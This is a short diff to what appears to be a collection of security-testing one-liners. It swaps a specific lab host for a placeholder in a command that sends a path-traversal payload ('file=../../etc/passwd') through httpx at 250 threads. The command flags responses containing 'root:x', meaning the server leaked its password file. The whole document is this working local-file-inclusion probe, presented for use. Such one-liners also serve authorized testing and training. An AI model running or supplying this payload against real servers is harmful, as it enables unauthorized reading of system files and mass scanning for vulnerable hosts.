@@ -1,1 +1,3 @@
-echo 'https://ptl-313b4387-c5deddff.libcurl.so/file.php?file=../../etc/passwd'|httpx -nc -t 250 -mr "root:x" -silent
+echo 'https://domain/file.php?file=../../etc/passwd'|httpx -nc -t 250 -mr "root:x" -silent
+
+
